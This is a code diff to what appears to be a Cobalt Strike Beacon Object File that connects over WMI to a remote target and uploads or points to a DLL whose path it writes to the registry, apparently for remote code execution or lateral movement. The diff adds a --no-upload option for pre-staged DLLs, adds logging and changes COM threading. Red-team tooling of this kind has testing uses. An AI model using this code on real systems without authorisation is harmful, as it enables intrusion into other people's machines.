@@ -178,6 +178,8 @@ static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) 
     for (int j = 0; ns_suffix[j] && i < 510; j++) wTarget[i++] = ns_suffix[j];
     wTarget[i] = L'\0';
 
+    TMB_INFO("Connecting WMI: %S", wTarget);
+
     BSTR bstrTarget = OLEAUT32$SysAllocString(wTarget);
     IWbemServices *pSvc = NULL;
     hr = pLocator->ConnectServer(bstrTarget, NULL, NULL, 0,
@@ -193,6 +195,7 @@ static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) 
     OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                              RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, EOAC_NONE);
+    TMB_INFO("WMI connected");
     return pSvc;
 }
 
@@ -595,6 +598,7 @@ extern "C" void go(char *args, int alen) {
     char *guid_alias = BeaconDataExtract(&parser, &tmp);
     char *func_name = BeaconDataExtract(&parser, &tmp);
     short no_cleanup = BeaconDataShort(&parser);
+    short no_upload = BeaconDataShort(&parser);
 
     if (!target || !*target) {
         TMB_ERR("Target is required.");
@@ -620,12 +624,24 @@ extern "C" void go(char *args, int alen) {
     char target_local_path[512] = {0};
     BOOL uploaded = FALSE;
 
-    if (dll_path_override && *dll_path_override) {
-        /* Use operator-supplied path directly (UNC or local-on-target) */
-        MSVCRT$_snprintf(remote_unc, sizeof(remote_unc), "%s", dll_path_override);
+    if (no_upload) {
+        /* --no-upload: user pre-staged the DLL, just use the path they gave */
+        if (dll_path_override && *dll_path_override) {
+            MSVCRT$_snprintf(target_local_path, sizeof(target_local_path), "%s", dll_path_override);
+        } else if (dll_len > 0) {
+            TMB_ERR("--no-upload requires --unc <path> (a path on target or UNC).");
+            return;
+        } else {
+            TMB_ERR("--no-upload requires --unc <path> (a path on target or UNC).");
+            return;
+        }
+        MSVCRT$_snprintf(dll_name, sizeof(dll_name), "%s", basename_of(target_local_path));
+        TMB_INFO("No upload -- using pre-staged: %s", target_local_path);
+    } else if (dll_path_override && *dll_path_override) {
+        /* UNC or remote path: write directly to registry, no upload */
         MSVCRT$_snprintf(target_local_path, sizeof(target_local_path), "%s", dll_path_override);
         MSVCRT$_snprintf(dll_name, sizeof(dll_name), "%s", basename_of(dll_path_override));
-        TMB_INFO("Using existing path: %s", dll_path_override);
+        TMB_INFO("Using path directly: %s", dll_path_override);
     } else if (dll_len > 0 && dll_data) {
         /* Upload DLL to target */
         random_dll_name(dll_name, sizeof(dll_name));
@@ -641,7 +657,7 @@ extern "C" void go(char *args, int alen) {
     }
 
     /* ---- Initialize COM + WMI connections ---- */
-    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
         TMB_ERR("CoInitializeEx failed: 0x%08lx", hr);
         if (uploaded) KERNEL32$DeleteFileA(remote_unc);
